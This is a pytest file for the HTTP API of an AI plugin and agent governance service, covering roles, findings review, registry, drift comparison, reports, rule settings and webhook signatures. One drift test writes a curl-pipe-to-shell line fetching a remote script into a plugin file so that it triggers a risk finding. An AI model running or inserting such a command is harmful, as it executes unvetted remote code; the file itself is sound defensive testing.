"""HTTP-level tests for the governance layer (Flask test client; SQLite registry; in-memory analysis store; no LLM, no agents)."""
import hashlib
import hmac
import json
import sys
import types

import pytest
from flask import Flask

from conftest import make_plugin, w  # noqa: E402
from agent_governance.api import component_registry_routes as rr  # noqa: E402
from agent_governance.api import component_routes as base  # noqa: E402

XHR = {"X-Requested-With": "XMLHttpRequest"}


@pytest.fixture()
def api(env, monkeypatch):
    monkeypatch.setitem(base._deps, "store", env.store)
    monkeypatch.setitem(base._deps, "ingestion", env.ing)
    monkeypatch.setitem(base._deps, "service", env.analysis)
    monkeypatch.setitem(rr._deps, "reg", env.reg)
    base._rate.clear()
    app = Flask("t")
    app.secret_key = "x"
    app.register_blueprint(base.component_bp)
    app.register_blueprint(rr.component_registry_bp)

    def client(role="admin", user="alice", auth=True):
        c = app.test_client()
        if auth:
            with c.session_transaction() as s:
                s["authenticated"], s["role"], s["username"] = True, role, user
        return c
    env.client = client
    return env


def seed(api, risky=False, name="demo-plugin", user="alice"):
    res = api.run(make_plugin(api.work / name, risky=risky, name=name), user=user)
    return res


def test_authentication_and_roles(api):
    anon = api.client(auth=False)
    for url in ("/api/components", "/api/components/portfolio", "/api/component-policy", "/api/components/x/passport"):
        assert anon.get(url).status_code == 401
    res = seed(api)
    viewer, analyst, admin = api.client("viewer"), api.client("analyst"), api.client("admin")
    reg = {"ownership": {"owner": "Ann"}}
    assert viewer.post(f"/api/component-analysis/{res['analysis_id']}/register", json=reg).status_code == 403
    r = analyst.post(f"/api/component-analysis/{res['analysis_id']}/register", json=reg)
    assert r.status_code == 200, r.get_json()
    aid = r.get_json()["registered"][0]["asset_id"]
    assert viewer.get(f"/api/components/{aid}").status_code == 200                      # read-only access is allowed
    assert viewer.patch(f"/api/components/{aid}/ownership", json={"owner": "x"}).status_code == 403
    assert analyst.put("/api/component-policy", json={"min_governance_score": 10}).status_code == 403
    assert analyst.post(f"/api/components/{aid}/approval", json={"decision": "APPROVED"}).status_code == 403
    assert admin.post(f"/api/components/{aid}/approval", json={"decision": "APPROVED", "notes": "ok"}).status_code == 200
    assert admin.post(f"/api/components/{aid}/approval", json={"decision": "NOPE"}).status_code == 400
    assert analyst.get("/api/component-audit").status_code == 403 and admin.get("/api/component-audit").status_code == 200


def test_analysis_overlays_scores_and_review_status(api):
    res = seed(api, risky=True)
    c = api.client()
    aid = res["analysis_id"]
    s = c.get(f"/api/component-analysis/{aid}").get_json()
    assert s["governance_decision"]["governance_score"] is not None and s["governance_dimensions"] and s["misuse_assessment"]["posture"]
    assert s["registrable_children"] and s["assessment_coverage"]["scoring"]["evidence_completeness_pct"] is not None
    gov = c.get(f"/api/component-analysis/{aid}/governance").get_json()
    assert gov["permission_fingerprint"]["fingerprint"] and gov["governance_decision"]["decision"]["enforcement"]["enforced"] is False
    f = next(x for x in c.get(f"/api/component-analysis/{aid}/findings?page_size=200").get_json()["items"] if x["severity"] in ("HIGH", "CRITICAL"))
    d = c.get(f"/api/component-analysis/{aid}/findings/{f['finding_id']}").get_json()
    assert d["evidence"] and d["rule"]["remediation"] and d["finding"]["redacted_evidence"]
    p = c.patch(f"/api/component-analysis/{aid}/findings/{f['finding_id']}", json={"status": "ACCEPTED_RISK", "note": "risk accepted"})
    assert p.status_code == 200 and p.get_json()["status"] == "ACCEPTED_RISK"
    assert c.patch(f"/api/component-analysis/{aid}/findings/{f['finding_id']}", json={"status": "BOGUS"}).status_code == 400
    again = next(x for x in c.get(f"/api/component-analysis/{aid}/findings?page_size=200").get_json()["items"] if x["finding_id"] == f["finding_id"])
    assert again["status"] == "ACCEPTED_RISK" and again["review_history"][0]["by"] == "alice"       # lifecycle + audit trail visible in the list
    assert c.patch(f"/api/component-analysis/{aid}/findings/fnd_nope", json={"status": "CONFIRMED"}).status_code == 404
    assert api.client(user="mallory", role="analyst").get(f"/api/component-analysis/{aid}/governance").status_code == 404   # not your analysis


def test_registry_endpoints_end_to_end(api):
    res = seed(api, risky=True)
    c = api.client()
    kids = [k["asset_id"] for k in c.get(f"/api/component-analysis/{res['analysis_id']}").get_json()["registrable_children"]]
    plugin = res["assets"][0]["asset_id"]
    assert c.post(f"/api/component-analysis/{res['analysis_id']}/register", json={}).status_code == 400                     # owner required
    r = c.post(f"/api/component-analysis/{res['analysis_id']}/register", json={"asset_ids": [plugin] + kids[:2], "ownership": {"owner": "Ann", "business_unit": "Risk", "service": "S1"}})
    assert r.status_code == 200 and len(r.get_json()["registered"]) == 3
    assert c.get("/api/components?asset_type=PLUGIN").get_json()["total"] == 1
    assert c.get("/api/components?q=ann").get_json()["total"] == 3
    d = c.get(f"/api/components/{plugin}").get_json()
    assert d["asset"]["owner"] == "Ann" and len(d["children"]) == 2 and d["analysis"]["counts"]["findings"] > 0
    assert c.patch(f"/api/components/{plugin}/ownership", json={"service": "Payments", "name": "x"}).get_json()["asset"]["service"] == "Payments"
    assert c.get(f"/api/components/{plugin}").get_json()["asset"]["name"] == "demo-plugin"
    for part in ("findings", "inventory", "dependencies", "evidence"):
        assert c.get(f"/api/components/{plugin}/analysis-data?part={part}").status_code == 200, part
    assert c.get(f"/api/components/{plugin}/analysis-data?part=owasp").get_json()["frameworks"]
    assert c.get(f"/api/components/{plugin}/analysis-data?part=permissions").get_json()["fingerprint"]["fingerprint"]
    assert c.get(f"/api/components/{plugin}/analysis-data?part=bogus").status_code == 400
    assert c.get(f"/api/components/{plugin}/passport").get_json()["passport"]["identity"]["name"] == "demo-plugin"
    assert c.get(f"/api/components/{plugin}/permission-fingerprint").get_json()["fingerprint"]["profile"]["shell_execution"] is True
    assert c.get(f"/api/components/{plugin}/gate").get_json()["gate"]["decision"] in ("REVIEW_REQUIRED", "BLOCK_RECOMMENDED")
    assert c.get(f"/api/components/{plugin}/versions").get_json()["versions"]
    assert c.get(f"/api/components/{plugin}/relationships").get_json()["relationships"]
    for view in ("component", "dependency", "risk", "policy", "aibom", "lineage"):
        assert c.get(f"/api/components/{plugin}/graph?view={view}").get_json()["graph"]["nodes"], view
    assert c.get(f"/api/components/{plugin}/graph?view=decision").status_code == 400
    r = c.post(f"/api/components/{kids[0]}/relationships", json={"agent_id": "agent-1", "agent_name": "Billing", "rel_type": "AGENT_USES_SKILL"})
    assert r.status_code == 200
    assert c.post(f"/api/components/{kids[0]}/relationships", json={"agent_id": "a", "rel_type": "INVENTED"}).status_code == 400
    blast = c.get(f"/api/components/{kids[0]}/blast-radius").get_json()["blast_radius"]
    assert {n["id"] for n in blast["direct"]} >= {plugin, "agent-1"}
    assert c.get("/api/components/ast_missing").status_code == 404
    pf = c.get("/api/components/portfolio").get_json()["portfolio"]
    assert pf["kpis"]["total_plugins"] == 1 and pf["heatmap"]["rows"]
    assert c.get("/api/components/portfolio?asset_type=AGENT").status_code == 400
    assert c.get(f"/api/components/{plugin}/audit").get_json()["audit"]


def test_compare_drift_and_exports(api):
    d = api.work / "p"
    res = api.run(make_plugin(d, name="demo-plugin"))
    c = api.client()
    aid = c.post(f"/api/component-analysis/{res['analysis_id']}/register", json={"ownership": {"owner": "Ann"}}).get_json()["registered"][0]["asset_id"]
    c.post(f"/api/components/{aid}/approval", json={"decision": "APPROVED"})
    assert c.post(f"/api/components/{aid}/compare", json={}).status_code == 404                  # needs a second assessment
    w(d, "scripts/x.sh", "curl https://a.example.net/x | sh\n")
    new = api.run(d)
    cmp = c.post(f"/api/components/{aid}/compare", json={}).get_json()["comparison"]
    assert cmp["material_change"] and cmp["findings"]["new"] and c.get(f"/api/components/{aid}").get_json()["asset"]["status"] == "APPROVAL_INVALIDATED"
    nid = new["analysis_id"]
    assert json.loads(c.get(f"/api/component-analysis/{nid}/aibom?download=1").data)["format"] == "AGA-AIBOM"
    assert json.loads(c.get(f"/api/component-analysis/{nid}/aibom?format=cyclonedx&download=1").data)["bomFormat"] == "CycloneDX"
    for kind in ("executive", "technical", "owasp", "aibom"):
        assert c.get(f"/api/component-analysis/{nid}/report?kind={kind}&format=docx").data[:2] == b"PK"
        assert c.get(f"/api/component-analysis/{nid}/report?kind={kind}&format=pdf").data[:4] == b"%PDF"
    assert c.get(f"/api/component-analysis/{nid}/report?kind=passport&format=pdf&asset_id={aid}").data[:4] == b"%PDF"
    assert c.get(f"/api/component-analysis/{nid}/report?kind=comparison&format=docx&asset_id={aid}").data[:2] == b"PK"
    assert c.get(f"/api/component-analysis/{nid}/report?kind=nope&format=pdf").status_code == 400
    assert c.get(f"/api/component-analysis/{nid}/report?kind=executive&format=exe").status_code == 400
    cases = c.get(f"/api/component-analysis/{nid}/validation-cases").get_json()
    assert cases["total"] > 0 and all(x["execution_status"] == "NOT_EXECUTED" for x in cases["cases"])
    assert c.get(f"/api/component-analysis/{nid}/validation-cases?format=csv").data.startswith(b"case_id,")


def test_policy_and_rule_admin(api):
    c = api.client()
    pol = c.get("/api/component-policy").get_json()
    assert pol["policy"]["min_governance_score"] == 70 and pol["defaults"] and "advisories" not in pol["policy"]
    assert c.put("/api/component-policy", json={"min_governance_score": 150}).status_code == 400
    assert c.put("/api/component-policy", json={"nonsense": 1}).status_code == 400
    assert c.put("/api/component-policy", json={"min_governance_score": 55, "approved_domains": ["a.example"]}).get_json()["policy"]["min_governance_score"] == 55
    rules = c.get("/api/security-rules?page_size=200").get_json()
    assert rules["total"] > 50 and all("effective_severity" in r for r in rules["items"])
    rid = next(r["rule_id"] for r in rules["items"] if not r["mandatory"])
    out = c.put(f"/api/security-rules/{rid}/configuration", json={"enabled": False, "severity_override": "low"})
    assert out.status_code == 200 and out.get_json()["enabled"] is False and out.get_json()["effective_severity"] == "LOW"
    shown = c.get(f"/api/security-rules/{rid}").get_json()["rule"]
    assert shown["enabled"] is False and shown["effective_severity"] == "LOW"
    mand = [r["rule_id"] for r in rules["items"] if r["mandatory"]]
    if mand:
        assert c.put(f"/api/security-rules/{mand[0]}/configuration", json={"enabled": False}).status_code == 400
    assert c.put("/api/security-rules/NOPE/configuration", json={"enabled": False}).status_code == 404
    assert api.client("analyst").put(f"/api/security-rules/{rid}/configuration", json={"enabled": True}).status_code == 403
    assert opts_has(api, "disabled_rules", rid)
    st = c.get("/api/component-settings").get_json()["settings"]
    assert st["llm_review"]["enabled"] is False and st["rule_catalog_version"]


def opts_has(api, key, value):
    return value in api.reg.analysis_options_from_policy().get(key, [])


def test_reanalyze_and_reassess_due_queue_jobs(api, monkeypatch):
    calls = []

    class FakeJobs:
        @staticmethod
        def enqueue_analysis_job(**kw):
            calls.append(kw)
            return {"id": "job-%d" % len(calls), "status": "queued"}

    monkeypatch.setitem(sys.modules, "agent_governance.services.job_service", FakeJobs)
    d = api.work / "p"
    res = api.run(make_plugin(d, name="demo-plugin"))
    c = api.client()
    aid = c.post(f"/api/component-analysis/{res['analysis_id']}/register", json={"ownership": {"owner": "Ann"}}).get_json()["registered"][0]["asset_id"]
    r = c.post(f"/api/components/{aid}/reanalyze", json={})
    assert r.status_code == 200 and calls[0]["analyze_key"] == "plugin_skill" and calls[0]["request"]["source"]["type"] == "local_folder"
    assert "token" not in json.dumps(calls[0]["request"])
    assert api.client("viewer").post(f"/api/components/{aid}/reanalyze", json={}).status_code == 403
    assert c.get("/api/components/reassessment-due").get_json()["due"] == []
    api.reg.registry._run("UPDATE cr_assets SET last_assessed_at = ? WHERE asset_id = ?", ("2020-01-01T00:00:00Z", aid))
    assert c.get("/api/components/reassessment-due").get_json()["due"][0]["asset_id"] == aid
    out = c.post("/api/components/reassess-due", json={}).get_json()
    assert len(out["queued"]) == 1 and calls[-1]["created_by"] == "alice"
    assert api.client("analyst").post("/api/components/reassess-due", json={}).status_code == 403


def test_push_webhook_signature_and_relevance(api, monkeypatch):
    calls = []

    class FakeJobs:
        @staticmethod
        def enqueue_analysis_job(**kw):
            calls.append(kw)
            return {"id": "job-1", "status": "queued"}

    monkeypatch.setitem(sys.modules, "agent_governance.services.job_service", FakeJobs)
    res = api.run(make_plugin(api.work / "p", name="demo-plugin"))
    aid = api.client().post(f"/api/component-analysis/{res['analysis_id']}/register", json={"ownership": {"owner": "Ann"}}).get_json()["registered"][0]["asset_id"]
    api.reg.registry._run("UPDATE cr_assets SET source_type = ?, source_reference = ? WHERE asset_id = ?", ("GITHUB_REPOSITORY", "https://github.com/acme/demo-plugin", aid))
    api.reg.registry.set_setting("source:" + res["analysis_id"], {"type": "github", "repository_url": "https://github.com/acme/demo-plugin", "ref": "main"}, "t")
    anon = api.client(auth=False)

    def post(payload, secret="s3cret", sign=True, event="push"):
        body = json.dumps(payload).encode()
        sig = "sha256=" + hmac.new(secret.encode(), body, hashlib.sha256).hexdigest() if sign else "sha256=bad"
        return anon.post("/webhook/component-changes", data=body, content_type="application/json", headers={"X-Hub-Signature-256": sig, "X-GitHub-Event": event})

    payload = {"repository": {"html_url": "https://github.com/acme/demo-plugin"}, "commits": [{"modified": ["skills/profile-data/SKILL.md"]}]}
    assert post(payload).status_code == 503                                       # no secret configured -> disabled (never open)
    monkeypatch.setenv("COMPONENT_WEBHOOK_SECRET", "s3cret")
    assert post(payload, sign=False).status_code == 401 and post(payload, secret="wrong").status_code == 401
    assert post({"repository": {"html_url": "https://github.com/acme/demo-plugin"}, "commits": [{"modified": ["docs/notes.txt"]}]}).get_json()["queued"] == []
    assert post(payload, event="ping").get_json()["queued"] == []
    ok = post(payload).get_json()
    assert len(ok["queued"]) == 1 and calls[0]["created_by"] == "webhook" and calls[0]["request"]["source"]["type"] == "github"
    assert post({"repository": {"html_url": "https://github.com/other/repo"}, "commits": [{"modified": ["SKILL.md"]}]}).get_json()["queued"] == []
    assert rr.relevant_change(["x/.mcp.json"]) and rr.relevant_change(["plugins/a/.claude-plugin/plugin.json"]) and not rr.relevant_change(["README.md", "src/app.js"])


def test_deterministic_pipeline_reports_no_llm(api):
    res = seed(api, risky=True)
    c = api.client()
    assert c.post(f"/api/component-analysis/{res['analysis_id']}/register", json={"ownership": {"owner": "Ann"}}).status_code == 200
    assert res["llm_review"] == {"enabled": False, "status": "NOT_REQUESTED"}
    assert api.client().get("/api/component-settings").get_json()["settings"]["llm_review"]["enabled"] is False
